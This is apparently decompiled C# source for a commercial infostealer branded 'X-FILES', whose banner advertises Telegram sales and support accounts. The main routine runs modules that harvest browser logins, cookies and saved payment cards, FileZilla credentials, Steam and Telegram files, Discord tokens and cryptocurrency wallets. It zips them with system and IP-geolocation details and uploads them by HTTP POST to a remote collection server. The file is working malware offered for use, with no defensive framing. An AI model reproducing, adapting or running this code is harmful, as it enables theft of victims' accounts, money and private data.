using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace hostik;

internal class Program
{
	private const int maxZipSize = 52428800;

	public static IPI locationInfo = PCI.GetUserCountryByIp(PCI.GetIP());

	private static void Main()
	{
		MemoryStream memoryStream = new MemoryStream();
		string comment = "██╗  ██╗      ███████╗██╗██╗     ███████╗ ██████╗\r\n╚██╗██╔╝      ██╔════╝██║██║     ██╔════╝██╔════╝\r\n ╚███╔╝ █████╗█████╗  ██║██║     █████╗  ╚█████╗ \r\n ██╔██╗ ╚════╝██╔══╝  ██║██║     ██╔══╝   ╚═══██╗\r\n██╔╝╚██╗      ██║     ██║███████╗███████╗██████╔╝\r\n╚═╝  ╚═╝      ╚═╝     ╚═╝╚══════╝╚══════╝╚═════╝\r\n-------------------------\r\nTelegram bot - @XFILESShop_Bot\r\nTelegram support - @XFILES_Seller\r\n";
		RegistryKey currentUser = Registry.CurrentUser;
		if (currentUser.GetValue("started") != null)
		{
			Environment.Exit(0);
		}
		BIR bIR = new BIR();
		StartInNewThread(FZ.stealer);
		StartInNewThread(FF.steale);
		StartInNewThread(hackrjaw.sppsps);
		StartInNewThread(St.StealSteam);
		StartInNewThread(Di.GetToken);
		StartInNewThread(Sc.ya_lubly_fe0syty);
		StartInNewThread(Te.XTelegram);
		StartInNewThread(CW.GetWallets);
		bIR.GetLogins();
		bIR.GetCards();
		int cookies = bIR.GetCookies();
		bool flag = false;
		using (ZipStorer zipStorer = ZipStorer.Create(memoryStream, comment))
		{
			zipStorer.EncodeUTF8 = true;
			zipStorer.ForceDeflating = true;
			zipStorer.AddFileStream(PCI.GetWindowsInfo(), "PCInfo.txt");
			zipStorer.AddFileStream(St.steamlist, "Grabber\\Steam\\Links.txt");
			zipStorer.AddFileStream(FZ.Filezilla_List, "Grabber\\FileZilla.txt");
			zipStorer.AddFileStream(FF.Passwords, "Browsers\\Logins\\FireFox.txt");
			zipStorer.AddFileStream(Di.dsL, "Grabber\\Discord\\Tokens.txt");
			for (int i = 0; i < FF.Cookies_Collect.coo_s.Count; i++)
			{
				zipStorer.AddFileStream(FF.Cookies_Collect.coo_s[i].cookies, "Browsers\\Cookies\\" + FF.Cookies_Collect.coo_s[i].browser + ".txt");
			}
			for (int j = 0; j < BIR.Login_Collect.coo_s.Count; j++)
			{
				zipStorer.AddFileStream(BIR.Login_Collect.coo_s[j].logins, "Browsers\\Logins\\" + BIR.Login_Collect.coo_s[j].browser + "_Logins.txt");
			}
			for (int k = 0; k < BIR.Card_Collect.coo_s.Count; k++)
			{
				zipStorer.AddFileStream(BIR.Card_Collect.coo_s[k].Cards, "Browsers\\Сards\\" + BIR.Card_Collect.coo_s[k].browser + ".txt");
			}
			for (int l = 0; l < BIR.Coockies_Collect.coo_s.Count; l++)
			{
				zipStorer.AddFileStream(BIR.Coockies_Collect.coo_s[l].Coockies, "Browsers\\Cookies\\" + BIR.Coockies_Collect.coo_s[l].browser + ".txt");
			}
			using (Stream source = new MemoryStream(Sc.gr_s.File))
			{
				zipStorer.AddStream(ZipStorer.Compression.Deflate, Sc.gr_s.name, source, DateTime.Now, "");
			}
			List<GrabberFileInfo> list = Te.TelegramFiles.Concat(St.gr_s).ToList();
			for (int m = 0; m < list.Count; m++)
			{
				Stream source2 = new MemoryStream(list[m].File);
				zipStorer.AddStream(ZipStorer.Compression.Deflate, "Grabber\\" + list[m].name, source2, DateTime.Now, "");
			}
			List<GrabberFileInfo> list2 = CW.CryptoWallets_Collect.files.Concat(GrabberFileInfo.gr_s).ToList();
			if (list2.Sum((GrabberFileInfo x) => x.Length) < 52428800)
			{
				for (int n = 0; n < list2.Count; n++)
				{
					Stream source3 = new MemoryStream(list2[n].File);
					zipStorer.AddStream(ZipStorer.Compression.Deflate, "Grabber\\" + list2[n].name, source3, DateTime.Now, "");
				}
				flag = true;
			}
		}
		if (!flag)
		{
			List<GrabberFileInfo> list3 = CW.CryptoWallets_Collect.files.Concat(GrabberFileInfo.gr_s).ToList();
			List<MemoryStream> list4 = new List<MemoryStream>();
			int num = Math.Max(list3.Sum((GrabberFileInfo x) => x.Length) / 52428800, 1);
			for (int num2 = 0; num2 < num; num2++)
			{
				MemoryStream memoryStream2 = new MemoryStream();
				using ZipStorer zipStorer2 = ZipStorer.Create(memoryStream2, comment);
				zipStorer2.EncodeUTF8 = true;
				zipStorer2.ForceDeflating = true;
				for (int num3 = 0; num3 < list3.Count && memoryStream2.Length + list3[num3].Length < 52428800L; num3++)
				{
					Stream source4 = new MemoryStream(list3[num3].File);
					zipStorer2.AddStream(ZipStorer.Compression.Deflate, "Grabber\\" + list3[num3].name, source4, DateTime.Now, "");
					list3.RemoveAt(num3);
				}
				if (memoryStream2.Length > 22L)
				{
					list4.Add(memoryStream2);
				}
			}
			for (int num4 = 0; num4 < list4.Count; num4++)
			{
				Upload(Convert.ToBase64String(list4[num4].ToArray()), $"Graber {num4}");
			}
		}
		Upload(Convert.ToBase64String(memoryStream.ToArray()), flag ? "Full" : "Base", cookies.ToString());
		currentUser.SetValue("started", "true");
	}

	public static void Upload(string data, string i = "", string cookies = "0")
	{
		using WebClient webClient = new WebClient();
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("zipx", data);
		nameValueCollection.Add("user_id", "219");
		nameValueCollection.Add("passworlds_x", BIR.pass.ToString());
		nameValueCollection.Add("ip_x", locationInfo.Ip);
		nameValueCollection.Add("cc_x", BIR.CC.ToString());
		nameValueCollection.Add("cookies_x", cookies);
		nameValueCollection.Add("zip_x", locationInfo.Postal);
		nameValueCollection.Add("contry_x", locationInfo.Country);
		nameValueCollection.Add("tag_x", "041221");
		nameValueCollection.Add("piece", i.ToString());
		byte[] bytes = webClient.UploadValues("http://xfilesebetreadline.online/log.php", "POST", nameValueCollection);
		Encoding.UTF8.GetString(bytes);
	}

	private static void StartInNewThread(ThreadStart start)
	{
		Thread thread = new Thread(start);
		thread.Start();
		thread.Join();
	}
}
